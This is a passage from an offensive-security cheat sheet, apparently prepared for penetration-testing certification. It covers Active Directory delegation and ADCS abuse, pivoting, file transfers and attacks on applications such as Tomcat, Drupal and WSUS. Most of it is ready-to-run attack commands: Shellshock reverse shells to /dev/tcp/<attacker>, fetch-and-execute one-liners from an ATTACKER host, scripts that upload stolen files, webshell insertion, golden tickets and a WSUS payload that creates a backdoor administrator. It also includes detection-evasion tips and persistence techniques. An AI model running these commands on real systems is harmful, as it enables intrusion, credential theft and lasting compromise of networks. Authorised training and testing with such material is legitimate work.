# Step 1: Create a fake computer account (any domain user can — ms-DS-MachineAccountQuota default 10)
addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Pass123!' -dc-ip <dc_ip> '<domain>/<user>:<pass>'

# Step 2: Write RBCD: target trusts FAKE01$
rbcd.py -delegate-from 'FAKE01$' -delegate-to '<TARGET>$' -action write -dc-ip <dc_ip> '<domain>/<user>:<pass>'

# Step 3: S4U as FAKE01$ to get TGS as admin for target
getST.py -spn cifs/<target>.<domain> -impersonate administrator -dc-ip <dc_ip> '<domain>/FAKE01$:Pass123!'

# Step 4: Use ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass <target>.<domain>
secretsdump.py -k -no-pass <target>.<domain>

# Cleanup: remove RBCD attribute
rbcd.py -delegate-from 'FAKE01$' -delegate-to '<TARGET>$' -action remove -dc-ip <dc_ip> '<domain>/<user>:<pass>'
```

**Windows equivalents (Rubeus):**
```powershell
# Unconstrained TGT harvest
Rubeus.exe monitor /interval:1 /nowrap

# Constrained S4U
Rubeus.exe s4u /user:<svc_account> /rc4:<nt_hash> /impersonateuser:administrator /msdsspn:cifs/<target> /ptt

# RBCD (after fake computer + DACL write done from Linux or PowerView)
Rubeus.exe s4u /user:FAKE01$ /rc4:<fake_hash> /impersonateuser:administrator /msdsspn:cifs/<target> /ptt
```

---

## 9.9 - DOMAIN TRUST ATTACKS

### 9.9.1 - Trust Enumeration

```bash
# CrackMapExec
netexec smb <dc_ip> -u <user> -p '<pass>' --trusts

# Impacket
lookupsid.py <domain>/<user>:<pass>@<dc_ip>

# PowerShell
Get-ADTrust -Filter *
Get-DomainTrustMapping

# BloodHound: "Find All Domain Trusts" query
```

### 9.9.2 - Child → Parent (ExtraSids Attack)

```
Required:
├── KRBTGT NT hash (child domain)
├── Child domain SID
├── Fake username
└── Enterprise Admins SID (parent): <PARENT_SID>-519
```

```bash
# Get child SID
lookupsid.py <child_domain>/<user>:<pass>@<child_dc> | grep "Domain SID"

# Linux: ticketer.py
ticketer.py -nthash <krbtgt_hash> -domain-sid <child_sid> -extra-sid <parent_sid>-519 -domain <child_domain> hacker
export KRB5CCNAME=hacker.ccache
secretsdump.py -k -no-pass -dc-ip <parent_dc> hacker@<parent_dc_fqdn>

# Windows: Mimikatz
mimikatz # kerberos::golden /user:hacker /domain:<child_domain> /sid:<child_sid> /krbtgt:<hash> /sids:<parent_sid>-519 /ptt

# Windows: Rubeus
Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_sid>-519 /user:hacker /ptt

# Automated
raiseChild.py -target-exec <parent_dc_ip> <child_domain>/admin
```

### 9.9.3 - Cross-Forest Trust Abuse

```bash
# Cross-Forest Kerberoasting
GetUserSPNs.py -target-domain <foreign_domain> <our_domain>/<user> -request
# Windows: Rubeus.exe kerberoast /domain:<foreign_domain> /user:<target> /nowrap

# Foreign group membership
Get-DomainForeignGroupMember -Domain <foreign_domain>

# Admin password reuse across forests
# Try same creds in trusting domain
netexec smb <foreign_dc> -u <user> -p '<pass>'
```

---

## 9.10 - ADCS ABUSE (ESC1-ESC11)

> Active Directory Certificate Services. High-value path on CPTS exam.
> Auth as user → request cert with target's SAN → PKINIT → TGT as target (often DA).

### 9.10.1 - ADCS Discovery + Vuln Scan

```bash
# Find CAs and templates
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -stdout
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -vulnerable -stdout
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -enabled -stdout

# Save full enum (JSON + text)
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip>

# Windows alt: Certify
.\Certify.exe find /vulnerable
.\Certify.exe cas              # List CAs
```

### 9.10.2 - ESC1 (EnrolleeSuppliesSubject + ClientAuth EKU)

```
Conditions:
├── Low-priv user has Enroll right
├── Template allows EnrolleeSuppliesSubject=True
├── EKU contains Client Authentication / Smart Card Logon / Any Purpose
└── ManagerApproval=False
```

```bash
# Request cert as Administrator
certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -target <ca_host> -template <vuln_template> -upn administrator@<domain>

# Authenticate (PKINIT) → NT hash + TGT
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>

# Output: NT hash of administrator → Pass-the-Hash anywhere
```

### 9.10.3 - ESC2 (Any Purpose EKU)

```
Conditions: Template has Any Purpose (OID 2.5.29.37.0) or no EKU + ClientAuth enroll
Same exploit as ESC1 (cert can be used for client auth)
```

```bash
certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -target <ca_host> -template <any_purpose_template> -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```

### 9.10.4 - ESC3 (Enrollment Agent template)

```
Conditions:
├── Template has Certificate Request Agent EKU
├── Low-priv user can enroll
└── Second template allows enrollment-on-behalf-of
```

```bash
# Get enrollment agent cert
certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -target <ca_host> -template <agent_template>

# Use it to request cert as administrator
certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -target <ca_host> -template User -on-behalf-of '<domain>\administrator' -pfx <agent>.pfx

certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```

### 9.10.5 - ESC4 (Writable Template ACL)

```
Conditions: We have WriteDACL / WriteOwner / GenericAll over a template
Exploit: Edit template → make it ESC1-vulnerable → request cert
```

```bash
# Make template ESC1-vulnerable
certipy template -u <user>@<domain> -p '<pass>' -template <target_template> -save-old

# Restore after (clean-up)
certipy template -u <user>@<domain> -p '<pass>' -template <target_template> -configuration <saved_config>

# Then exploit as ESC1
```

### 9.10.6 - ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)

```
Conditions: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set (CA-level, not template)
Exploit: Any template with ClientAuth EKU works — specify SAN in request
```

```bash
certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -target <ca_host> -template User -upn administrator@<domain>
# CA blindly accepts the SAN
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```

### 9.10.7 - ESC7 (CA Admin / Officer Rights)

```
Conditions: We have ManageCA or ManageCertificates over CA
Exploit: Grant self enrollment on ESC1-style template, OR approve own pending request
```

```bash
# Self-grant Officer rights, approve own request
certipy ca -u <user>@<domain> -p '<pass>' -ca <ca_name> -add-officer <user>
certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -template SubCA -upn administrator@<domain>   # Will be denied — request ID needed
certipy ca -u <user>@<domain> -p '<pass>' -ca <ca_name> -issue-request <request_id>
certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -retrieve <request_id>
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```

### 9.10.8 - ESC8 (HTTP Enrollment + NTLM Relay)

```
Conditions: CA exposes /certsrv HTTP enrollment endpoint, no EPA, no HTTPS-only
Exploit: Coerce DC auth → relay to /certsrv → cert as DC$ → DCSync
```

```bash
# Check HTTP enrollment exposed
curl -I http://<adcs_host>/certsrv/
# Returns 401 NTLM = vulnerable

# Start relay (template DomainController for DC machine account)
certipy relay -target http://<adcs_host> -template DomainController
# Or with impacket
ntlmrelayx.py -t http://<adcs_host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC auth (see §9.8.7 for all coercion methods)
python3 PetitPotam.py <attacker_ip> <dc_ip>

# Relayed → PFX file saved → authenticate as DC$
certipy auth -pfx <dc_machine_account>.pfx -dc-ip <dc_ip>

# DC$ hash → DCSync
secretsdump.py -just-dc -hashes :<dc_nt_hash> '<domain>/<dc_account>$@<dc_ip>'
```

### 9.10.9 - ESC9 / ESC10 / ESC11 (newer, less common)

```
ESC9: no security extension on template + write GenericWrite on victim → set victim UPN to admin → request cert
ESC10: weak certificate mapping (Schannel) — similar UPN swap path
ESC11: NTLM relay to ICPR RPC endpoint (no /certsrv needed)

certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -target <ca_host> -template ESC9 -upn administrator
# For ESC11:
certipy relay -target rpc://<adcs_host> -template DomainController
```

### 9.10.10 - Persistence via Certificate

```bash
# Once you have a cert, save it — valid for years even after password rotation
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>   # gets fresh TGT/hash on demand

# Forge "Golden Certificate" (CA compromised — extract CA key)
certipy ca -backup -u <user>@<domain> -p '<pass>' -ca <ca_name>
# Output: CA .pfx → forge certs for any user, persistent backdoor
certipy forge -ca-pfx <ca>.pfx -upn administrator@<domain>
```

---

## 9.11 - POST-DOMAIN COMPROMISE

```
├─ Dump NTDS.dit: secretsdump.py <domain>/<da>:<pass>@<dc_ip>
├─ Golden Ticket: kerberos::golden /krbtgt:HASH /domain:DOMAIN /sid:SID
├─ Silver Ticket: kerberos::golden /user:Admin /domain:DOMAIN /sid:SID /target:SPN /rc4:HASH
├─ Skeleton Key: misc::skeleton (inject into DC memory)
├─ AdminSDHolder: Modify ACL → propagate to all protected groups
├─ DSRM backdoor: Enable DSRM network logon
├─ Certificate persistence: Install ADCS, issue persistent certs
└─ Domain trust → compromise parent/trusting domain
```

---

> AD iterative rules consolidated at end of doc — see "ITERATIVE METHODOLOGY RULES".

---

# PHASE 10: PIVOTING & TUNNELING

> After compromising pivot host, enumerate NICs/routing, then tunnel.
> Always check for dual-homed hosts (ip a / ipconfig).

---

## 10.0 - Pivot Discovery
```bash
# On compromised host - check for additional networks
ip a                    # Linux
ipconfig /all           # Windows
route print             # Windows
ip route                # Linux

# Note all subnets not reachable from attack host
# These are pivot targets
```

## 10.1 - SSH Tunneling
```bash
# Local port forward (access remote service via local port)
ssh -L <local_port>:<target_service>:<service_port> user@<pivot>
ssh -L 3306:10.10.10.5:3306 user@pivot  # Access internal MySQL

# Remote port forward (expose local service to remote network - for reverse shells)
ssh -R <remote_port>:<local_service>:<local_port> user@<pivot>
ssh -R 8080:127.0.0.1:8080 user@pivot   # Expose local web server

# Full reverse shell workflow through pivot:
# 1. Create payload targeting pivot IP
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<pivot_ip> LPORT=4444 -f elf -o shell.elf
# 2. Transfer to pivot
scp shell.elf user@pivot:/tmp/
# 3. Set up socat relay on pivot
socat TCP-LISTEN:4444,fork TCP:<attacker>:4444
# 4. Start listener on attacker
msfconsole → use exploit/multi/handler → set payload → exploit
# 5. Run payload on target (connects to pivot:4444 → relayed to attacker:4444)

# Dynamic (SOCKS proxy)
ssh -D 1080 user@<pivot>

# Usage with proxychains
proxychains nmap -sT -Pn <internal_target>
proxychains curl http://<internal_target>
```

## 10.1b - Ligolo-ng (CPTS exam default pivot)

> Userland VPN-style tunneling. No proxychains needed — kernel routes traffic via TUN interface.
> Preferred over Chisel/SSH for CPTS exam: faster, supports UDP/ICMP, handles full subnets.

**Setup (one-time on attacker):**
```bash
# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

**Run proxy (attacker):**
```bash
# Self-signed cert mode
./proxy -selfcert -laddr 0.0.0.0:11601

# In proxy console:
ligolo-ng » session                # List sessions
ligolo-ng » [select session]
[Agent] » ifconfig                 # See agent's interfaces
[Agent] » start                    # Start tunnel
```

**Run agent (on pivot host):**
```bash
# Linux pivot
./agent -connect <attacker>:11601 -ignore-cert &

# Windows pivot
.\agent.exe -connect <attacker>:11601 -ignore-cert
```

**Route internal subnet through tunnel (attacker):**
```bash
# After ifconfig on agent shows e.g. 172.16.5.0/23
sudo ip route add 172.16.5.0/23 dev ligolo

# Now hit internal hosts directly — no proxychains
nmap -sT -Pn 172.16.5.10
evil-winrm -i 172.16.5.10 -u user -p pass
xfreerdp /v:172.16.5.10 /u:user /p:pass
```

**Expose attacker port back to internal network (reverse listener):**
```bash
# In ligolo console (lets internal hosts reach attacker for callbacks/shells)
[Agent] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
[Agent] » listener_list

# Internal target connects to <pivot_internal_ip>:4444 → relayed to attacker:4444
```

**Double pivot (Agent A → Agent B):**
```bash
# Agent A on first pivot — already connected
# From Agent A's shell, run second agent connecting to Agent A's IP on next subnet
# OR: route a new ligolo proxy through first tunnel:

# 1. On attacker, expose proxy listen port into network A:
[AgentA] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# 2. Run agent on Pivot B pointing at Pivot A's IP
./agent -connect <pivotA_ip>:11601 -ignore-cert
# 3. New session appears in ligolo console — select it, start, route subnet B
sudo ip route add <subnet_B> dev ligolo
```

**Cleanup:**
```bash
sudo ip route del <subnet> dev ligolo
sudo ip link set ligolo down
sudo ip tuntap del ligolo mode tun
```

## 10.2 - Chisel
```bash
# Server (attacker)
chisel server --reverse --port 8080

# Client (target - reverse SOCKS)
chisel client <attacker>:8080 R:socks

# Client (target - specific forward)
chisel client <attacker>:8080 R:3306:<internal_host>:3306
```

## 10.3 - Proxychains
```bash
# /etc/proxychains.conf
socks5 127.0.0.1 1080

# Usage
proxychains <command>
```

## 10.4 - Socat Relay
```bash
# Basic relay (redirect traffic from local port to target)
socat TCP-LISTEN:<local_port>,fork TCP:<target>:<target_port>

# Reverse shell redirect (pivot receives shell, forwards to attacker)
socat TCP-LISTEN:<pivot_port>,fork TCP:<attacker>:<attacker_port>

# Bind shell redirect (target has bind shell, pivot forwards to attacker)
socat TCP-LISTEN:<local_port>,fork TCP:<target>:<bind_port>
```

## 10.5 - Sshuttle (transparent proxy - no proxychains needed)
```bash
# Route entire subnet through pivot
sshuttle -r user@<pivot> <internal_subnet>
sshuttle -r user@pivot 10.10.10.0/24

# Now use tools directly (no proxychains wrapper)
nmap -sT -Pn 10.10.10.5
curl http://10.10.10.5
```

## 10.6 - Meterpreter Tunneling
```bash
# Auto-route (adds routes for all target subnets)
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > run autoroute -p  # Print routes

# SOCKS proxy via Meterpreter
use auxiliary/server/socks_proxy
set SRVPORT 1080
run
# Then: proxychains nmap -sT -Pn <internal>

# Port forwarding (local - access remote service locally)
meterpreter > portfwd add -L <local_port> -p <remote_port> -r <internal_host>

# Port forwarding (reverse - expose local to target)
meterpreter > portfwd add -R -L <local_port> -p <remote_port> -r <attacker>
```

## 10.7 - Plink.exe (SSH for Windows)
```bash
# Dynamic port forwarding from Windows target
plink -ssh -D 1080 user@<attacker>

# With Proxifier for full tool proxying
# Or use with proxychains on attacker side
```

## 10.8 - Windows Netsh Port Forwarding
```powershell
# On compromised Windows host
netsh interface portproxy add v4tov4 listenport=<local> listenaddress=0.0.0.0 connectport=<remote> connectaddress=<internal_host>
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=<local>
```

# PHASE 10B: FILE TRANSFERS

## Transfer Methods Decision Tree
```
Can you write to disk on target?
├─ YES → Use wget/curl/certutil/bitsadmin
└─ NO → Fileless: curl URL | bash / IEX DownloadString / php -r pipe

What ports are outbound-open?
├─ 80/443 → HTTP(S): python http.server, nginx PUT, uploadserver
├─ 445 → SMB: impacket-smbserver (authenticated if guest blocked)
├─ 445 blocked but 80 open → WebDAV (wsgidav)
├─ 21 → FTP: pyftpdlib (--write for uploads)
├─ 22 → SCP
├─ 5985/5986 → WinRM Copy-Item session
├─ 3389 → RDP drive mount (xfreerdp /drive:)
└─ None of the above → Base64 clipboard, /dev/tcp, RDP mount

Is PowerShell blocked?
├─ YES → certutil, bitsadmin CLI, LOLBAS, cscript/vbscript, code-based
└─ NO → Invoke-WebRequest (-UseBasicParsing, -UserAgent spoof, SSL bypass)

Need to exfiltrate sensitive loot (NTDS.dit, SAM)?
└─ Encrypt first: openssl enc -aes256 -pbkdf2 -in FILE -out FILE.enc
```

**Code-based transfers (when wget/curl unavailable):**
```bash
# PHP download
php -r 'file_put_contents("/tmp/file",file_get_contents("http://ATTACKER/file"));'

# PHP upload
php -r 'file_put_contents("http://ATTACKER/upload",file_get_contents("/tmp/file"));'

# Python download
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://ATTACKER/file","/tmp/file")'

# Python upload
python3 -c 'import requests;requests.post("http://ATTACKER/upload",files={"f":open("/tmp/file","rb")})'

# Bash /dev/tcp (no wget/curl/nc)
exec 3<>/dev/tcp/ATTACKER/80; echo -e "GET /file HTTP/1.0\n\n">&3; cat <&3 > /tmp/file

# Fileless execution (Linux)
curl -s http://ATTACKER/shell.sh | bash
wget -qO- http://ATTACKER/shell.sh | bash

# Fileless execution (Windows)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
```

**WebDAV (SMB 445 blocked, HTTP 80 open):**
```bash
# Attacker
pip3 install wsgidav cheroot
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

# Target (Windows)
dir \\ATTACKER\DavWWWRoot
copy file.exe \\ATTACKER\DavWWWRoot\
```

**WinRM session file transfer:**
```powershell
# Between Windows hosts (no external server needed)
$Session = New-PSSession -ComputerName TARGET -Credential $Cred
Copy-Item -Path C:\file.exe -ToSession $Session -Destination C:\Windows\Temp\
Copy-Item -FromSession $Session -Path C:\remote\file -Destination C:\local\
```

**RDP drive mount:**
```bash
# Mount local drive to remote RDP session
xfreerdp /v:TARGET /u:user /p:pass /drive:share,/tmp
# Access on target: \\tsclient\share\file
```

**User agent evasion:**
```powershell
# Spoof browser UA to avoid detection
$UA = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://ATTACKER/file -OutFile file -UserAgent $UA
```

**certutil UA fingerprint:** Microsoft-CryptoAPI/10.0
**BITS UA fingerprint:** Microsoft BITS/7.8
**PowerShell UA fingerprint:** WindowsPowerShell/5.x

## Transferring TO Windows
```bash
# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8080/file.exe','C:\Windows\Temp\file.exe')"

# Invoke-WebRequest (-UseBasicParsing if IE first-launch not completed)
powershell -c "Invoke-WebRequest -Uri http://ATTACKER:8080/file.exe -OutFile C:\Windows\Temp\file.exe -UseBasicParsing"

# Download + execute (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')

# SSL/TLS bypass for HTTPS
powershell -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object Net.WebClient).DownloadFile('https://ATTACKER/file.exe','C:\file.exe')"

# certutil (always present)
certutil -urlcache -f http://ATTACKER:8080/file.exe C:\Windows\Temp\file.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://ATTACKER:8080/file.exe C:\Windows\Temp\file.exe

# SMB (unauthenticated)
copy \\ATTACKER\share\file.exe C:\Windows\Temp\file.exe

# SMB with authentication (newer Windows blocks guest)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
net use n: \\ATTACKER\share /user:test test
copy n:\file.exe C:\Windows\Temp\file.exe

# FTP command file (non-interactive shells)
echo open ATTACKER > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.exe >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

# WebDAV (SMB over HTTP - when SMB blocked but HTTP allowed)
# Attacker: sudo pip3 install wsgidav cheroot && sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
dir \\ATTACKER\DavWWWRoot
copy file.exe \\ATTACKER\DavWWWRoot\

# MSI execution
msiexec /q /i shell.msi

# DLL execution
rundll32.exe shell.dll,EntryPoint
```

## Upload FROM Target
```bash
# PowerShell upload (attacker runs uploadserver)
pip3 install uploadserver && python3 -m uploadserver
# On target:
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://ATTACKER:8000/upload -File C:\path\to\file

# Base64 POST upload
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\file' -Encoding Byte))
Invoke-WebRequest -Uri http://ATTACKER:8000/ -Method POST -Body $b64
```

## Transferring TO Linux
```bash
# wget/curl
wget http://ATTACKER:8080/file -O /tmp/file
curl http://ATTACKER:8080/file -o /tmp/file

# scp
scp file user@TARGET:/tmp/

# netcat
nc -lvnp 4444 > file  # on receiver
nc ATTACKER 4444 < file  # on sender

# Base64 (small files, no network tools)
cat file | base64 -w 0; echo    # Encode (no line wraps)
echo 'BASE64...' | base64 -d > file  # Decode
```

## File Validation
```bash
file shell            # Verify file type
md5sum shell          # Verify integrity
# Windows:
Get-FileHash file -Algorithm md5
```

---

# PHASE 11: COMMON APPLICATIONS

> Identify CMS/app first, then follow app-specific attack path.
> Always check default creds before brute-forcing.

---

## 11.0 - CMS Detection Decision Tree
```
Web App Discovered
├── Fingerprints CMS?
│   ├── /wp-content, /wp-admin, meta generator="WordPress" → WordPress
│   ├── /administrator, /components, /modules, /plugins → Joomla
│   ├── /node, CHANGELOG.txt, meta generator="Drupal" → Drupal
│   └── robots.txt reveals structure → check each path
├── Java stack? (port 8080, 8009)
│   ├── /manager/html → Tomcat (WAR upload RCE)
│   ├── Jenkins UI → Jenkins (Script Console)
│   └── /wsdl, /axis2 → SOAP services
├── .NET stack? (port 80/443, ASPX pages)
│   ├── /Trace.axd, /elmah.axd → Debug/Error info
│   └── DNN (DotNetNuke) → SQL console, file upload
├── PHP stack?
│   ├── phpMyAdmin at /phpmyadmin → DB access
│   └── Laravel/Yii/Symfony → framework-specific vulns
├── Default login portal? → Try creds list per app
├── No auth required? → Splunk Free, open GitLab
└── Unknown app? → searchsploit, CVE lookup, Wappalyzer
```

## 11.0b - CMS-Specific Attacks

### WordPress
```bash
# WPScan
wpscan --url http://<target> --enumerate --api-token <token>
wpscan --url http://<target> --enumerate ap  # All plugins
wpscan --url http://<target> --enumerate at  # All themes

# User enumeration (login page error messages)
# Valid user + wrong pass: "The password for username admin is incorrect"
# Invalid user: "The username someone is not registered"

# Brute force via XML-RPC (faster, batched)
wpscan --url http://<target> --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt

# Theme editor RCE (needs admin)
# Appearance → Theme Editor → 404.php → Add: system($_GET[0]);
# Access: http://<target>/wp-content/themes/theme/404.php?0=id
```

### Joomla
```bash
joomscan -u http://<target>
droopescan scan joomla -u http://<target>
# Check robots.txt for /administrator/
# Default creds: admin:admin
# Template RCE: Extensions → Templates → edit index.php → insert webshell
# CVE-2019-10945: Directory traversal in com_media
```

### Drupal
```bash
# Version detection
curl -s http://<target>/CHANGELOG.txt | head -5
droopescan scan drupal -u http://<target>

# Drupalgeddon2 (CVE-2018-7600) - Unauthenticated RCE
use exploit/unix/drupal/drupal_drupageddon2

# Drupalgeddon3 (CVE-2018-7602) - Authenticated RCE
# Requires valid session cookie

# PHP Filter module (if enabled)
# Admin → Modules → Enable PHP Filter
# Create content → PHP code → <?php system($_GET['cmd']); ?>
```

### Apache Tomcat
```bash
# Default credentials
# tomcat:tomcat, admin:admin, admin:(empty), admin:tomcat, tomcat:s3cret

# WAR upload RCE (after getting manager access)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f war -o shell.war
curl -u tomcat:tomcat --upload-file shell.war "http://<target>:8080/manager/text/deploy?path=/shell&update=true"
curl http://<target>:8080/shell/

# Ghostcat (CVE-2020-1938) - AJP LFI
# Reads webapp files via AJP port 8009
nmap -p 8009 <target>  # Check if AJP exposed
```

### ColdFusion
```bash
# Admin panel
# /CFIDE/administrator/index.cfm

# Directory traversal (CVE-2010-2861)
# Read password hashes: /CFIDE/administrator/enter.cfm?locale=../../../../../../lib/password.properties%00en

# Unauthenticated RCE (CVE-2009-2265)
# FCKeditor file upload
```

### Shellshock (CVE-2014-6271)
```bash
# Check CGI scripts
gobuster dir -u http://<target>/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x sh,cgi,pl

# Exploit via User-Agent
curl -A '() { :; }; echo; /bin/cat /etc/passwd' http://<target>/cgi-bin/status

# Reverse shell
curl -A '() { :; }; /bin/bash -i >& /dev/tcp/<attacker>/<port> 0>&1' http://<target>/cgi-bin/status
```

### IIS Tilde Enumeration
```bash
# 8.3 short name disclosure (Windows/IIS)
# Discover hidden files/dirs via ~1 short names
nmap --script http-enum -p 80 <target>
# Or: IIS-ShortName-Scanner (Java)
java -jar iis_shortname_scanner.jar http://<target>
```

### DotNetNuke (DNN)
```bash
# Default admin: host/dnnhost
# SQL Console: Admin → SQL Console → enable xp_cmdshell
# File upload: Allow .asp/.exe extensions via SQL
# Install Modules: Admin → Extensions → upload malicious module
# CVE-2017-9822: Cookie deserialization RCE
```

## 11.1 - Jenkins
```
├─ Default creds: admin:admin
├─ Script Console: /manage → /script
│  └─ RCE: Runtime.getRuntime().exec("cmd /c powershell ...")
├─ Build job: Create job → Build Steps → Execute shell
└─ CVE check: searchsploit jenkins
```

## 11.2 - Splunk
```
├─ Default creds: admin:changeme
├─ Splunk Universal Forwarder RCE
│  └─ Deploy custom app with reverse shell script
└─ Search → run commands via savedsearches.conf
```

## 11.3 - PRTG Network Monitor
```
├─ Default creds: prtgadmin:prtg
├─ CVE-2018-9276 (RCE via authenticated RCE)
└─ API abuse: /api/table.json?content=devices&columns=device
```

## 11.4 - GitLab
```
├─ Public repos → search for creds, config files
├─ User registration (if open)
├─ API: /api/v4/projects, /api/v4/users
└─ Git clone → search history for secrets: git log -p --all
```

## 11.5 - osTicket
```
├─ Default creds: check docs
├─ File upload via ticket attachment
└─ SQL injection in older versions
```

## 11.6 - phpMyAdmin
```
├─ Default creds: root:(empty), root:root
├─ SQL console → SELECT INTO OUTFILE → webshell
├─ Write to webroot: SET GLOBAL general_log = 'ON'; SET GLOBAL general_log_file = '/var/www/html/shell.php';
└─ UDF RCE: CREATE FUNCTION sys_exec RETURNS STRING
```

## 11.7 - Nagios
```
├─ Default creds: nagiosadmin:nagios
├─ CVE-2016-9566 (RCE)
└─ RCE via config manipulation
```

## 11.8 - SCCM / MECM (Enterprise Networks)

> Microsoft Endpoint Configuration Manager. Site Servers hold Network Access Account creds in plaintext
> in the policy. Frequent path to DA in enterprise networks.

```bash
# Identify SCCM
# - Servers with "MP_" computer accounts, SMS_SiteSystem groups
# - SCCM clients reach out to MP via HTTP

# Enumerate SCCM (SharpSCCM)
.\SharpSCCM.exe local site-info
.\SharpSCCM.exe get site-info -mp <management_point> -sc <sitecode>
.\SharpSCCM.exe get devices -mp <mp> -sc <sitecode>

# Network Access Account (NAA) extraction (CVE-2022-37971 + classic policy abuse)
# Requires: client cert OR any AD-joined machine
python3 sccmwtf.py <client_fqdn> <site_server_fqdn>
# Or
.\SharpSCCM.exe get naa -mp <mp> -sc <sitecode>
# Output: NAA creds → often local admin on many hosts, sometimes DA

# Coerce SCCM site server (auto-relay candidate)
# Site server often has full client-push rights → coerce + relay to LDAPS
python3 PetitPotam.py <attacker> <sccm_site_server>
ntlmrelayx.py -t ldaps://<dc> --delegate-access
```

## 11.9 - WSUS Patch Poisoning (Unauth)

> If WSUS uses HTTP (not HTTPS) for client checkins, push attacker-signed patches to clients.

```bash
# Check WSUS in use
# Client registry: HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\WUServer
reg query "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer

# If WUServer is http:// (not https://) → exploit
# PyWSUS — MITM WSUS, inject malicious update
python3 pywsus.py --host 0.0.0.0 --port 8530 --executable /tmp/PsExec64.exe --command '/accepteula /s cmd /c "net user backdoor Pass123! /add && net localgroup administrators backdoor /add"'

# Trigger client check
# Victim: wuauclt /detectnow  →  pulls malicious update  →  RCE as SYSTEM

# Mitigation pre-check: WSUS over HTTPS + signed updates → not vulnerable
```

## 11.10 - Veeam Backup Server

> Veeam stores credentials (often DA / service accounts) in its config DB. Always check if you can
> read the Veeam database or hit the Veeam API.

```bash
# Identify
# - Port 9392 (Veeam API), 9401 (mount svc), 10006 (svc)
nmap -p 9392,9401,10006 -sV <target>

# If we have local admin on Veeam Backup Server:
# Dump creds from MSSQL "VeeamBackup" DB
.\Veeam-Get-Creds.ps1
# Or PowerShell direct query:
Invoke-Sqlcmd -ServerInstance "VEEAMSERVER\VEEAMSQL2016" -Database "VeeamBackup" -Query "SELECT user_name, password FROM Credentials"
# Decrypt with Veeam DPAPI key (key in registry / config)

# CVE-2023-27532 — pre-auth credential exposure on Veeam Backup & Replication v11/v12
# Affects port 9401
python3 CVE-2023-27532.py -t <target> -p 9401
```

---

# PHASE 12: DOCUMENTATION & REPORTING

> CPTS exam: report = ~40% of pass weight. 7-day exam window, 48-hour report write.
> Report rejected = exam fail, even if all flags captured.

## 12.1 - During Assessment (collect as you go)

- **Timestamp every action** (`script -t timing.log assessment.log` records terminal + timing)
- **Save scan output with exact syntax** — copy/paste full command + first 20 lines of output minimum
- **Screenshot every finding**: command + output visible, terminal title shows target hostname/IP
- **Credentials log**: maintain `loot/creds.txt` with `host:port|user|cred|source|first-seen`
- **Host inventory**: `loot/hosts.md` with hostname, IP, OS, services, foothold path, privesc method
- **Exploitation timeline**: append-only log `loot/timeline.md` — every successful action with timestamp
- **Raw output preservation**: `nmap -oA`, `tee` everything, keep Burp project file

## 12.2 - CVSS 3.1 Quick Reference

```
Vector: CVSS:3.1/AV:?/AC:?/PR:?/UI:?/S:?/C:?/I:?/A:?

AV (Attack Vector):    N=Network, A=Adjacent, L=Local, P=Physical
AC (Attack Complexity): L=Low, H=High
PR (Privileges Req'd): N=None, L=Low, H=High
UI (User Interaction): N=None, R=Required
S  (Scope):            U=Unchanged, C=Changed
C/I/A (Confid/Integ/Avail): N=None, L=Low, H=High

Severity bands:
 0.0       None
 0.1-3.9   Low
 4.0-6.9   Medium
 7.0-8.9   High
 9.0-10.0  Critical

Common quick scores:
